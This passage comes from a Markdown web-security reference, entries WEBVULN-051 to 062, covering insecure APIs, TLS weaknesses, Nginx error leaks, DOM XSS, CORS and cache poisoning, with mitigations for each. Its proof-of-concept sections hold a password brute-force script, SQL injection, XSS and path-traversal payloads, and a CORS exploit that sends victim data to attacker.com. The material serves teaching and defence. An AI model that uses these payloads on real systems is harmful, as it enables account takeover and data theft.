### 📚 References
- [OWASP PHP Object Injection](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)
- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [PHPGGC GitHub](https://github.com/ambionics/phpggc)
- [PortSwigger - Object Injection](https://portswigger.net/kb/issues/00300300_php-object-injection)
***
## PART VIII

## API Security Issues

---
# 🕷️ WEBVULN-051: Insecure API Endpoints

## 📝 Description
Insecure API endpoints refer to exposed application interfaces that lack proper authentication, authorization, input validation, or rate limiting. These vulnerabilities often allow attackers to gain unauthorized access to sensitive data or manipulate backend systems by abusing weak or misconfigured API implementations.

In modern web applications and microservices, APIs serve as the backbone of data exchange. Poorly secured endpoints can lead to data breaches, privilege escalation, and remote code execution.

---

## 💥 Demo / Proof of Concept

**Example 1: Missing Authentication**
```http
GET /api/user/profile HTTP/1.1
Host: vulnerable-app.com
```
---
An attacker sends this request and receives another user's profile data due to missing authentication checks.

Example 2: Broken Object Level Authorization
```
GET /api/admin/users/123 HTTP/1.1
Authorization: Bearer <user-token>

```

## 🛡️ Mitigation  
- Enforce authentication on all API endpoints.  
- Implement role-based access control (RBAC) and object-level authorization.  
- Validate and sanitize all incoming data (even from authenticated users).  
- Disable or restrict verbose error messages to avoid exposing internal logic.  
- Use rate limiting and throttling to prevent brute-force attacks.  
- Implement API gateways or WAFs to apply consistent security policies.  
- Document APIs properly and apply security-first design principles.  
- Regularly conduct security reviews and penetration tests.  

## 🧪 Testing Tools / Techniques  
- Burp Suite (API scanning and fuzzing)  
- OWASP ZAP (automated scanning)  
- Postman or Insomnia (manual testing)  
- fuzzapi or APIsec (API-specific fuzzing tools)  
- Review OpenAPI/Swagger specs for insecure configurations  
- Static and dynamic code analysis for endpoint behavior  

📚 References  
- OWASP API Security Top 10  
- PortSwigger – Insecure APIs  
- CWE-287: Improper Authentication  
- CWE-285: Improper Authorization  
- API Security Testing Guide  

---
# WEBVULN-052: API Key Exposure

## Category  
Sensitive Data Exposure

## Vulnerability  
**API Key Exposure**

## Description  
API key exposure occurs when secret keys used to authenticate or authorize access to APIs are accidentally embedded in client-side code or publicly accessible repositories. Once an API key is exposed, malicious actors can abuse the service, resulting in data leaks, quota exhaustion, unexpected charges, or unauthorized access.

Common sources of exposure include:
- Hardcoding API keys in frontend JavaScript or mobile apps
- Committing secrets to version control (e.g., GitHub)
- Client-side error messages revealing keys in stack traces or URLs

## Demo / Proof of Concept  
Example of an exposed key in JavaScript code:

```javascript
const apiKey = "AIzaSyD1-fake-exposed-key-1234567890";
fetch(`https://maps.googleapis.com/maps/api/geocode/json?address=New+York&key=${apiKey}`)
  .then(response => response.json())
  .then(data => console.log(data));
```

Or an exposed key in a public GitHub repo:

```bash
git clone https://github.com/example-org/vulnerable-project.git
cd vulnerable-project
grep -r 'api_key' .
```

## Mitigation  

- **Do not hardcode secrets** in client-side code (e.g., JavaScript, Android/iOS apps).
- **Use environment variables** or secure secrets managers to inject keys at runtime on the server side.
- **Proxy requests**: Route client requests through your backend and keep API keys hidden from the frontend.
- **Restrict API key usage** by:
  - IP address
  - Referrer/domain
  - Quotas and scopes
- **Enable monitoring** and **rotate keys** regularly.
- **Scan your codebase** and Git history for accidental exposure using tools like `truffleHog`, `gitleaks`, or `GitGuardian`.

## Testing Tools / Techniques

- **GitGuardian** – Detects API keys and secrets in codebases and Git history.
- **truffleHog** – Searches through Git repositories for high entropy strings.
- **gitleaks** – Scans repositories for secrets and keys.
- **Manual Code Review** – Search for `key`, `apiKey`, `token`, or similar patterns in source code.

## References

- [OWASP API Security Top 10 – API3:2019 – Excessive Data Exposure](https://owasp.org/www-project-api-security/2019/#api3-excessive-data-exposure)
- [Google Cloud – Best Practices for API Key Security](https://cloud.google.com/docs/authentication/api-keys)
- [GitGuardian Blog – API Key Leaks](https://blog.gitguardian.com/tag/api-keys/)
- [Mozilla Developer Network – API Security](https://developer.mozilla.org/en-US/docs/Web/Security)

***
# WEBVULN-053: Lack of Rate Limiting

## Category  
API Security / Authorization

## Vulnerability  
**Lack of Rate Limiting**

## Description  
Lack of rate limiting allows attackers to send an unlimited number of requests to a server without restrictions. This can lead to brute-force attacks, credential stuffing, resource exhaustion (DoS), and abuse of API functionality. Without rate limiting, malicious actors can automate requests and overwhelm the system or exploit sensitive operations (e.g., login, password reset, form submissions).

Typical attack scenarios include:
- Repeated login attempts to brute-force credentials
- Spamming account creation or form submission endpoints
- Scraping large volumes of data from APIs
- Abusing paid APIs without constraints

## Demo / Proof of Concept  

Example of a brute-force attack script against a login endpoint without rate limits:

```python
import requests

url = "https://example.com/api/login"
user = "victim@example.com"

with open("common_passwords.txt") as f:
    for password in f:
        response = requests.post(url, json={"email": user, "password": password})
        print(f"Trying {password} → {response.status_code}")
```

Expected behavior without rate limiting:
- The server responds to all attempts without any delay, lockout, or CAPTCHA.
- An attacker can try thousands of passwords in a short time.

## Mitigation  

- **Implement server-side rate limiting** using tools like:
  - NGINX `limit_req`
  - Express middleware like `express-rate-limit`
  - API gateways with built-in rate control
- **Use CAPTCHA** or challenge-response tests on sensitive operations (e.g., login, password reset)
- **Account lockout policies**: Temporarily lock or slow down login attempts after several failed tries
- **Throttling based on IP address or user account**
- **Monitor and log** repeated requests to sensitive endpoints
- **Use WAF (Web Application Firewall)** to block or flag high-frequency requests

## Testing Tools / Techniques

- **Burp Suite Intruder** – Automate request floods to test for rate limits.
- **OWASP ZAP** – Passive and active scan plugins for detecting lack of throttling.
- **Manual testing** – Repeatedly submit requests and observe for any response delays, block messages, or error codes.
- **Custom scripts** – Write Python or Bash scripts to simulate high-frequency requests.

## References

- [OWASP API Security Top 10 – API4:2019 – Lack of Resources & Rate Limiting](https://owasp.org/www-project-api-security/2019/#api4-lack-of-resources--rate-limiting)
- [OWASP Cheat Sheet – Brute Force Protection](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html#brute-force-protection)
- [Express-rate-limit GitHub Repo](https://github.com/nfriedly/express-rate-limit)
- [Cloudflare Rate Limiting](https://developers.cloudflare.com/rate-limiting/)
***
# WEBVULN-054: Inadequate Input Validation

## Category  
Input Validation / Data Sanitization

## Vulnerability  
**Inadequate Input Validation**

## Description  
Inadequate input validation occurs when an application fails to properly check and sanitize user-supplied data before processing it. This opens the door to a wide range of vulnerabilities, including:

- SQL Injection
- Cross-Site Scripting (XSS)
- Command Injection
- Path Traversal
- Buffer Overflow (in native code contexts)

Validation flaws typically arise when developers:
- Trust client-side validation without re-validating on the server
- Allow overly permissive inputs (e.g., no length, format, or type checks)
- Concatenate inputs directly into commands, queries, or file paths

## Demo / Proof of Concept  

### Example 1: XSS due to lack of HTML sanitization

```html
<input type="text" name="comment" />
```

Server blindly reflects user input:

```html
<p>You said: [user_input]</p>
```

Input:  
```html
<script>alert('XSS');</script>
```

### Example 2: SQL Injection

```python
username = request.GET['user']
query = f"SELECT * FROM users WHERE username = '{username}'"
```

Input:  
```
' OR 1=1 --
```

Result: Full user table dump if not sanitized.

## Mitigation  

- **Validate input on both client and server sides**  
  - Type checks (e.g., integer, string, boolean)  
  - Length limits  
  - Whitelist acceptable values and patterns  
  - Reject anything not strictly expected

- **Sanitize inputs** before rendering or processing:
  - Use libraries like `DOMPurify` for HTML
  - Use parameterized queries / prepared statements for SQL
  - Escape special characters properly in shell commands and file paths

- **Use strict content types and encoding**
  - Set response headers like `Content-Type`, `X-Content-Type-Options`, and `Content-Security-Policy`

- **Avoid dynamic execution of user input**

- **Leverage validation libraries/frameworks**:
  - Joi (Node.js)
  - Cerberus (Python)
  - Hibernate Validator (Java)

## Testing Tools / Techniques

- **Burp Suite / OWASP ZAP** – Actively fuzz input fields with malicious payloads.
- **Fuzzing tools** – Use tools like `wfuzz`, `ffuf`, or custom scripts to test for injection points.
- **Static Code Analysis** – Identify lack of input validation in source code.
- **Manual testing** – Try inputs like:
  - `' OR 1=1 --`
  - `<script>alert(1)</script>`
  - `../../etc/passwd`

## References

- [OWASP Top 10 – A03:2021 – Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [OWASP Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Prevention_Cheat_Sheet.html)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

***
## PART IX
---
INSECURE COMMUNICATION
---
# WEBVULN-055: Man-in-the-Middle (MITM) Attack

## Category  
Transport Layer Security / Network Attack

## Vulnerability  
**Man-in-the-Middle (MITM) Attack**

## Description  
A Man-in-the-Middle (MITM) attack occurs when an attacker secretly intercepts and possibly alters communication between two parties without their knowledge. This typically happens when data is transmitted over an insecure or improperly secured network, such as public Wi-Fi or websites lacking proper TLS encryption.

In the context of web applications, MITM attacks can lead to:
- Credential theft (e.g., login usernames and passwords)
- Session hijacking
- Data tampering in transit
- Unauthorized access to sensitive user or application data

MITM attacks can exploit:
- Plain HTTP (instead of HTTPS)
- Expired or invalid TLS certificates
- Downgrade attacks (e.g., forcing fallback to insecure protocols)
- Weak or misconfigured encryption algorithms
- Rogue access points or compromised routers

## Demo / Proof of Concept

### Scenario: Capturing login credentials on insecure HTTP

1. A user visits `http://example.com/login` on public Wi-Fi.
2. The attacker intercepts traffic using a tool like `Wireshark` or `mitmproxy`.
3. When the user submits login credentials, the attacker sees:

```
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=secret123
```

### Tools commonly used for MITM attacks:
- `ettercap`
- `mitmproxy`
- `Wireshark`
- `Bettercap`
- `dsniff`

## Mitigation  

- **Enforce HTTPS (TLS) across the entire application**
  - Use HSTS (HTTP Strict Transport Security) headers:
    ```
    Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
    ```
  - Redirect all HTTP requests to HTTPS
  - Disable TLS versions below 1.2 (avoid SSLv2, SSLv3, TLS 1.0/1.1)
  - Use a valid certificate from a trusted CA

- **Secure API communication**
  - Enforce HTTPS on all REST/GraphQL endpoints
  - Validate TLS certificates on client-side (e.g., mobile apps)
  - Use certificate pinning where feasible

- **Avoid mixed content**
  - Ensure all embedded resources (scripts, images, etc.) are loaded over HTTPS

- **Use secure cookies**
  - Set cookies with `Secure` and `HttpOnly` flags:
    ```http
    Set-Cookie: sessionid=xyz; Secure; HttpOnly; SameSite=Strict
    ```

- **Educate users to avoid public Wi-Fi for sensitive tasks**  
  - Or encourage the use of a VPN when accessing your platform remotely

- **Use DNS security extensions (DNSSEC)**  
  - To prevent DNS spoofing that could enable MITM setups

- **Monitor and log TLS errors**
  - Detect downgrade attempts or invalid cert usage in real time

## Testing Tools / Techniques

- **mitmproxy** – Intercept and inspect HTTP/HTTPS traffic
- **Wireshark** – Analyze unencrypted traffic over insecure networks
- **SSL Labs** – Analyze TLS configuration of your site: https://www.ssllabs.com/ssltest/
- **Burp Suite** – Identify insecure transmission of sensitive data
- **nmap + ssl-enum-ciphers** – Check supported TLS/SSL versions and ciphers

## References

- [OWASP Transport Layer Protection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html)
- [OWASP Man-in-the-Middle Attack](https://owasp.org/www-community/attacks/Man-in-the-middle)
- [Mozilla TLS Configuration Guidelines](https://infosec.mozilla.org/guidelines/web_security#transport-layer-security-tls)
- [SSL Labs Test Tool](https://www.ssllabs.com/ssltest/)
- [Bettercap MITM Framework](https://www.bettercap.org/)

***
# WEBVULN-056: Insufficient Transport Layer Security

## Category  
Transport Layer Security / Configuration Weakness

## Vulnerability  
**Insufficient Transport Layer Security**

## Description  
Insufficient Transport Layer Security occurs when a web application fails to properly secure data in transit using strong encryption standards. This vulnerability leaves sensitive information—such as login credentials, tokens, and personal user data—susceptible to eavesdropping, tampering, or Man-in-the-Middle (MITM) attacks.

Common causes of insufficient TLS include:
- Using **HTTP** instead of **HTTPS**
- Supporting **outdated protocols** like SSLv2, SSLv3, TLS 1.0 or 1.1
- Using **weak cipher suites** or key exchange algorithms (e.g., RC4, 3DES, NULL ciphers)
- Expired, self-signed, or mismatched TLS certificates
- Lack of **HTTP Strict Transport Security (HSTS)** enforcement
- Allowing **mixed content** (HTTP resources on HTTPS pages)

## Demo / Proof of Concept

### Scenario: Application uses TLS 1.0 with weak ciphers

1. Run an SSL scan using `nmap` or `sslscan`:
    ```bash
    nmap --script ssl-enum-ciphers -p 443 example.com
    ```

2. Output reveals:
    ```
    SSLv3 supported
    TLSv1.0 supported
    Weak cipher: DES-CBC3-SHA
    ```

3. Attacker leverages this weak configuration to:
   - Perform a downgrade attack
   - Decrypt captured sessions using tools like `sslsplit` or `BEAST attack` techniques

### Tools to Test:
- `nmap --script ssl-enum-ciphers`
- `testssl.sh`
- `ssllabs.com` TLS analysis
- `openssl s_client -connect example.com:443 -tls1`

## Mitigation

- **Enforce strong TLS configurations**:
  - Only support TLS 1.2 and 1.3
  - Disable SSLv2, SSLv3, TLS 1.0, and TLS 1.1 in the web server configuration
  - Example for Apache:
    ```apache
    SSLProtocol all -SSLv3 -TLSv1 -TLSv1.1
    SSLCipherSuite HIGH:!aNULL:!MD5:!3DES:!RC4
    ```

- **Enable HTTP Strict Transport Security (HSTS)**:
  ```http
  Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
  ```

- **Use a valid TLS certificate from a trusted Certificate Authority (CA)**:
  - Avoid expired or self-signed certs
  - Enable automatic renewal (e.g., via Let's Encrypt + certbot)

- **Eliminate mixed content**:
  - Ensure all assets (images, scripts, stylesheets) are loaded over HTTPS

- **Set secure flags on cookies**:
  ```http
  Set-Cookie: session=xyz; Secure; HttpOnly; SameSite=Strict
  ```

- **Regularly test your TLS configuration** using external tools and adjust as needed

## Testing Tools / Techniques

- **SSL Labs SSL Test** – Comprehensive public scanner: https://www.ssllabs.com/ssltest/
- **testssl.sh** – CLI TLS scanner for supported ciphers and protocol versions
- **nmap ssl-enum-ciphers** – Port scan + TLS inspection
- **Burp Suite / OWASP ZAP** – Detects insecure transport issues in app traffic
- **Wireshark** – Identify unencrypted or weakly encrypted traffic

## References

- [OWASP Transport Layer Protection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html)
- [Mozilla SSL Configuration Guidelines](https://infosec.mozilla.org/guidelines/web_security#transport-layer-security-tls)
- [SSL Labs Test](https://www.ssllabs.com/ssltest/)
- [testssl.sh GitHub](https://github.com/drwetter/testssl.sh)
- [RFC 8996 - Deprecating TLS 1.0 and 1.1](https://datatracker.ietf.org/doc/html/rfc8996)
***
# WEBVULN-057: Insecure SSL/TLS Configuration

## Category  
Transport Layer Security / Misconfiguration

## Vulnerability  
**Insecure SSL/TLS Configuration**

## Description  
Insecure SSL/TLS configuration refers to improper setup of secure communication protocols, which can undermine the confidentiality and integrity of data transmitted between clients and servers. Even when TLS is used, weak or outdated configurations can leave an application vulnerable to exploits such as protocol downgrade attacks, cipher suite attacks, or man-in-the-middle (MITM) interception.

Common insecure SSL/TLS configuration issues include:
- Enabling outdated protocols (SSLv2, SSLv3, TLS 1.0/1.1)
- Allowing weak or deprecated cipher suites (e.g., RC4, DES, NULL, EXPORT)
- Missing or misconfigured server certificate chains
- Lack of support for Forward Secrecy (FS)
- Self-signed, expired, or mismatched certificates
- Not enforcing HTTPS via HSTS headers

## Demo / Proof of Concept

### Scenario: Server supports weak ciphers and deprecated TLS versions

1. Run a TLS scan using `testssl.sh`:
    ```bash
    ./testssl.sh https://example.com
    ```

2. Output shows:
    ```
    SSLv3 offered (deprecated)
    TLS 1.0/1.1 supported
    Weak cipher: RC4-SHA
    No Forward Secrecy with common browsers
    ```

3. Implications:
    - Vulnerable to BEAST, POODLE, or downgrade attacks
    - Possible passive decryption of traffic
    - Fails modern browser security standards

## Mitigation

- **Disable deprecated protocols**:
  - Configure your server to only support TLS 1.2 and 1.3
  - Example (Apache):
    ```apache
    SSLProtocol -all +TLSv1.2 +TLSv1.3
    ```

- **Use strong cipher suites**:
  - Avoid RC4, 3DES, EXPORT, NULL, and MD5-based ciphers
  - Example (Nginx):
    ```nginx
    ssl_ciphers 'EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH';
    ssl_prefer_server_ciphers on;
    ```

- **Implement HTTP Strict Transport Security (HSTS)**:
    ```http
    Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
    ```

- **Enable Perfect Forward Secrecy (PFS)**:
  - Use key exchange algorithms such as ECDHE or DHE

- **Use valid, trusted TLS certificates**:
  - Issued by a reputable CA (e.g., Let's Encrypt, DigiCert)
  - Renew certificates before expiration
  - Ensure full certificate chain is served

- **Test regularly and patch server libraries**:
  - Keep OpenSSL, nginx, Apache, and Java-based servers up to date

## Testing Tools / Techniques

- **testssl.sh** – Full-featured TLS scanner for protocol and cipher issues
- **SSL Labs** – Online test for TLS configuration grading
- **nmap --script ssl-enum-ciphers** – Quick cipher and protocol scan
- **openssl s_client** – Manual TLS handshake and cert inspection
- **Burp Suite / OWASP ZAP** – Identifies weak TLS usage in web traffic

## References

- [OWASP SSL/TLS Best Practices](https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html)
- [SSL Labs Best Practices Guide](https://github.com/ssllabs/research/wiki/SSL-and-TLS-Deployment-Best-Practices)
- [Mozilla SSL Configuration Generator](https://ssl-config.mozilla.org/)
- [testssl.sh GitHub](https://github.com/drwetter/testssl.sh)
- [RFC 7525 - Recommendations for Secure Use of TLS and DTLS](https://datatracker.ietf.org/doc/html/rfc7525)
***
# WEBVULN-058: Insecure Communication Protocols

## Category  
Transport Layer Security / Network Protocols

## Vulnerability  
**Insecure Communication Protocols**

## Description  
Insecure communication protocols are protocols that transmit data in plaintext or use outdated cryptographic mechanisms, making them vulnerable to eavesdropping, manipulation, or impersonation attacks. These protocols fail to provide confidentiality, integrity, or authenticity guarantees, especially over untrusted networks such as the internet or public Wi-Fi.

Examples of insecure protocols include:
- **HTTP** (instead of HTTPS)
- **FTP** (instead of SFTP or FTPS)
- **Telnet** (instead of SSH)
- **SMTP/IMAP/POP3 without STARTTLS**
- **LDAP without LDAPS**
- **SNMPv1/v2c** (use SNMPv3 instead)
- **RDP without TLS**

Consequences include:
- Credential theft
- Session hijacking
- Sensitive data disclosure
- Traffic tampering via MITM attacks

## Demo / Proof of Concept

### Scenario: Credential sniffing via Telnet

1. A system administrator connects to a remote server using Telnet:
    ```bash
    telnet 192.168.1.10
    ```

2. An attacker intercepts the traffic using Wireshark or `tcpdump`.

3. Login credentials are transmitted in cleartext:
    ```
    login: admin
    password: root123
    ```

4. Attacker now has access to the target system using stolen credentials.

## Mitigation

- **Avoid plaintext protocols altogether**:
  - Replace:
    - HTTP → **HTTPS**
    - FTP → **SFTP** or **FTPS**
    - Telnet → **SSH**
    - LDAP → **LDAPS**
    - SNMPv1/v2c → **SNMPv3**
    - RDP → **RDP with TLS/NLA**

- **Enforce TLS encryption for all application-layer protocols**:
  - SMTP, IMAP, POP3 should use **STARTTLS**
  - Reject non-secure connections or upgrade them automatically

- **Use VPNs or secure tunnels (e.g., SSH tunnels) when TLS isn't available**

- **Disable insecure protocols and ports at the firewall or server configuration level**

- **Educate developers and sysadmins** to use secure alternatives by default

- **Implement HSTS and certificate pinning in web apps**

- **Monitor for deprecated protocol usage** using IDS/IPS tools

## Testing Tools / Techniques

- **Wireshark / tcpdump** – Packet sniffing and traffic inspection
- **nmap** – Detect open ports and service banners:
    ```bash
    nmap -sV -p- target.com
    ```
- **sslscan / testssl.sh** – Inspect secure vs insecure services
- **Burp Suite / ZAP** – Detects use of HTTP or unsecured APIs
- **Security headers scanners** – Check for HTTPS enforcement (e.g., HSTS)

## References

- [OWASP Secure Communication Guidelines](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html)
- [NIST SP 800-52r2 – Guidelines for TLS](https://csrc.nist.gov/publications/detail/sp/800-52/rev-2/final)
- [Mozilla SSL Configuration](https://infosec.mozilla.org/guidelines/web_security#transport-layer-security-tls)
- [SSL Labs Test](https://www.ssllabs.com/ssltest/)
- [testssl.sh GitHub](https://github.com/drwetter/testssl.sh)
***
# WEBVULN-059: Verbose Nginx Error Messages

## Category  
Information Disclosure / Server Misconfiguration

## Vulnerability  
**Verbose Nginx Error Messages**

## Description  
When Nginx is not properly configured to suppress detailed error output, it may leak sensitive server-side information through verbose error messages. These messages can reveal software versions, internal directory paths, technologies used (e.g., PHP-FPM, upstream services), and configuration details that aid attackers in fingerprinting and targeted exploitation.

Examples of common leakages:
- Nginx version info in `Server:` header or error pages
- Full paths in 404, 502, 503, or 504 responses (e.g., `/var/www/html/index.php`)
- Exposure of upstream services (e.g., FastCGI, PHP-FPM, proxy_pass IPs)
- Default error pages revealing server behavior

## Demo / Proof of Concept

### Scenario: Nginx returns detailed 502 Bad Gateway error

1. Client accesses a broken PHP page:
    ```
    https://example.com/broken.php
    ```

2. Nginx returns:
    ```
    502 Bad Gateway
    nginx/1.20.1
    ```

3. In some misconfigurations, it may also leak:
    ```
    connect() failed (111: Connection refused) while connecting to upstream,
    client: 192.168.1.5, server: example.com, request: "GET /broken.php HTTP/1.1",
    upstream: "fastcgi://127.0.0.1:9000",
    ```

4. An attacker now knows:
    - Server runs nginx/1.20.1
    - PHP-FPM is on localhost:9000
    - Internal IP ranges

## Mitigation

- **Suppress server version exposure**:
    ```nginx
    server_tokens off;
    ```

- **Customize or hide error pages**:
    ```nginx
    error_page 403 404 500 502 503 504 /custom_error.html;
    location = /custom_error.html {
        root /var/www/html;
        internal;
    }
    ```

- **Disable automatic directory indexing**:
    ```nginx
    autoindex off;
    ```

- **Set minimal logging in production**:
    ```nginx
    error_log /var/log/nginx/error.log warn;
    ```

- **Use a WAF or reverse proxy to filter error content before exposure to end-users**

- **Regularly review logs and sanitize output before deployment**

## Testing Tools / Techniques

- Manual browsing and forced error conditions (e.g., access `/nonexistent`)
- `curl -I https://target.com` – Inspect headers and server tokens
- `nikto`, `whatweb`, `wappalyzer` – Fingerprinting tools
- Browser dev tools – Check status codes and response bodies

## References

- [OWASP Error Handling and Logging](https://owasp.org/www-project-secure-headers/)
- [Nginx Documentation – server_tokens](https://nginx.org/en/docs/http/ngx_http_core_module.html#server_tokens)
- [Nginx Custom Error Pages](https://nginx.org/en/docs/http/ngx_http_core_module.html#error_page)
- [CIS NGINX Benchmark](https://www.cisecurity.org/benchmark/nginx)
***
PART X 
---

## Client Side Vulnerabilities

---
# WEBVULN-060: DOM-Based Cross-Site Scripting (XSS)

## Category  
Cross-Site Scripting (XSS) / Client-Side Vulnerabilities

## Vulnerability  
**DOM-Based Cross-Site Scripting (XSS)**

## Description  
DOM-Based XSS is a type of Cross-Site Scripting where the vulnerability exists in the client-side code rather than the server-side. It occurs when JavaScript on a page processes data from untrusted sources (e.g., `document.URL`, `location.hash`, `document.referrer`, etc.) and dynamically updates the DOM without proper sanitization or escaping.

Unlike reflected or stored XSS, the payload is never processed by the server, making it harder to detect with traditional server-side filters or logs.

Common sources:
- `document.location`
- `document.URL`
- `document.referrer`
- `window.name`
- `location.hash`

Common sinks:
- `innerHTML`
- `document.write()`
- `eval()`
- `setTimeout()` / `setInterval()` (with string arguments)
- `window.location`

## Demo / Proof of Concept

### Vulnerable Code (Client-Side)
```html
<script>
  const params = new URLSearchParams(window.location.search);
  const user = params.get("user");
  document.getElementById("greeting").innerHTML = "Hello " + user;
</script>
```

### Malicious URL
```
https://example.com/page.html?user=<img src=x onerror=alert('XSS')>
```

### Result
- The malicious input is inserted into the DOM via `innerHTML`, causing script execution in the victim's browser.

## Mitigation

- **Avoid using unsafe DOM APIs with untrusted input**:
  - Prefer `textContent` over `innerHTML`
  - Avoid `eval()`, `document.write()`, etc.

- **Sanitize input before inserting into the DOM**:
  - Use a trusted client-side sanitization library like [DOMPurify](https://github.com/cure53/DOMPurify)
    ```javascript
    const clean = DOMPurify.sanitize(user);
    document.getElementById("greeting").innerHTML = "Hello " + clean;
    ```

- **Use secure JavaScript frameworks**:
  - Frameworks like React, Vue, and Angular automatically escape data bindings

- **Content Security Policy (CSP)**:
  - Implement a strict CSP to restrict inline scripts and reduce XSS impact:
    ```http
    Content-Security-Policy: default-src 'self'; script-src 'self'
    ```

- **Validate input types, lengths, and characters even on the client-side**

- **Regular code audits and automated testing**

## Testing Tools / Techniques

- Manual testing with payloads in URL, hash, or referrer
- Browser dev tools – observe DOM manipulation
- **Burp Suite** – DOM XSS scanner and Repeater tool
- **OWASP ZAP** – Passive scanner and fuzzing
- **DOM Invader** (from PortSwigger) – Browser extension for detecting DOM XSS sinks/sources

## References

- [OWASP DOM Based XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS)
- [DOMPurify GitHub](https://github.com/cure53/DOMPurify)
- [PortSwigger XSS Guide](https://portswigger.net/web-security/cross-site-scripting/dom-based)
- [Content Security Policy (CSP) Guide](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [Google Web Fundamentals: XSS Prevention](https://developers.google.com/web/fundamentals/security/csp)

***
# WEBVULN-061: Insecure Cross-Origin Communication

## Category  
Cross-Origin Resource Sharing (CORS) / Client-Side Security

## Vulnerability  
**Insecure Cross-Origin Communication**

## Description  
Insecure cross-origin communication arises when a web application improperly configures or implements mechanisms that allow scripts from untrusted origins to access sensitive resources or APIs. This often occurs due to misconfigured **Cross-Origin Resource Sharing (CORS)** headers or insecure use of cross-origin messaging (e.g., `postMessage`), leading to unauthorized data access, privilege escalation, or execution of unintended actions.

Key risks include:
- Allowing all origins (`Access-Control-Allow-Origin: *`)
- Reflecting `Origin` headers dynamically without validation
- Insecure use of `postMessage()` without origin verification
- Cross-origin access to sensitive endpoints or APIs

## Demo / Proof of Concept

### Scenario: Misconfigured CORS

**Vulnerable Response Header**
```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

### Exploit

1. Attacker hosts the following script on a malicious domain:
    ```javascript
    fetch("https://victim.com/api/userinfo", {
        credentials: "include"
    })
    .then(response => response.text())
    .then(data => {
        // Exfiltrate sensitive data
        fetch("https://attacker.com/steal?data=" + encodeURIComponent(data));
    });
    ```

2. Victim visits the attacker's site while logged in to `victim.com`.

3. The attacker's script accesses sensitive data from the API and exfiltrates it.

## Mitigation

- **Restrict `Access-Control-Allow-Origin`**:
  - Never use `*` with `Access-Control-Allow-Credentials: true`
  - Whitelist only trusted, necessary origins:
    ```http
    Access-Control-Allow-Origin: https://trusted.example.com
    ```

- **Do not reflect arbitrary origins dynamically**:
  ```javascript
  if (allowedOrigins.includes(req.headers.origin)) {
      res.setHeader("Access-Control-Allow-Origin", req.headers.origin);
  }
  ```

- **Validate target origin in `postMessage` communication**:
    ```javascript
    window.addEventListener("message", function(event) {
        if (event.origin !== "https://trusted.example.com") return;
        // Safe to handle event.data
    });
    ```

- **Disable unnecessary cross-origin features**:
  - Limit cross-origin API access
  - Avoid exposing sensitive data to scripts in different origins

- **Use SameSite cookies and CSRF tokens where applicable**

- **Implement security headers**:
    ```http
    Content-Security-Policy: default-src 'self';
    ```

## Testing Tools / Techniques

- **Burp Suite / ZAP** – Scan for CORS misconfigurations
- **curl** – Manually test CORS responses:
    ```bash
    curl -H "Origin: https://evil.com" --verbose https://target.com/api/
    ```

- **Postman** – Simulate cross-origin requests with credentials

- **CORS Misconfiguration Scanners**:
  - CORScanner
  - CORSy

- **Browser DevTools** – Inspect network requests and response headers

## References

- [OWASP CORS Misconfiguration](https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny)
- [Mozilla Developer Network – CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
- [PortSwigger CORS Vulnerabilities Guide](https://portswigger.net/web-security/cors)
- [OWASP postMessage Security](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#postmessage)
- [SameSite Cookies Explained](https://web.dev/samesite-cookies-explained/)
***
# WEBVULN-062: Browser Cache Poisoning

## Category  
Client-Side Caching / Web Application Misconfiguration

## Vulnerability  
**Browser Cache Poisoning**

## Description  
Browser Cache Poisoning occurs when an attacker is able to manipulate the contents of a user's browser cache to store malicious or unintended responses. This can lead to the delivery of outdated, tampered, or attacker-controlled content, especially when the application uses improper cache-control headers. The vulnerability is particularly dangerous when malicious scripts, modified resources, or altered HTML are cached and subsequently served to users.

Scenarios that enable cache poisoning:
- Using static cacheable URLs for dynamic responses
- Cacheable responses containing user-specific or unvalidated content
- Lack of appropriate `Cache-Control`, `ETag`, or `Vary` headers

Consequences include:
- Persistent Cross-Site Scripting (XSS)
- Defacement or injection of fake UI elements
- Forced logouts or content substitution

## Demo / Proof of Concept

### Scenario: Poisoning a JavaScript file

1. Web server responds to requests for a JavaScript file with:
    ```http
    Cache-Control: public, max-age=31536000
    ```

2. An attacker exploits a reflected XSS vulnerability in a query parameter:
    ```
    https://example.com/script.js?q=<script>alert('Poison')</script>
    ```

3. Due to improper cache controls, the browser caches the tainted response.

4. Future visits load the poisoned script from the browser cache—even on legitimate pages.

## Mitigation

- **Set strict cache control headers** for dynamic or user-specific content:
    ```http
    Cache-Control: no-store, no-cache, must-revalidate
    Pragma: no-cache
    ```

- **Avoid caching responses that include query parameters unless content is static and safe to share**

- **Use unique versioned URLs for static content**:
    ```
    /static/js/app.v3.4.2.js
    ```

- **Add `Vary` headers where applicable**:
    ```http
    Vary: Accept-Encoding, User-Agent
    ```

- **Validate and sanitize all user input, especially inputs reflected in cached responses**

- **Do not serve sensitive information from shared cache endpoints**

- **Use Content Security Policy (CSP)** to reduce impact of injected scripts

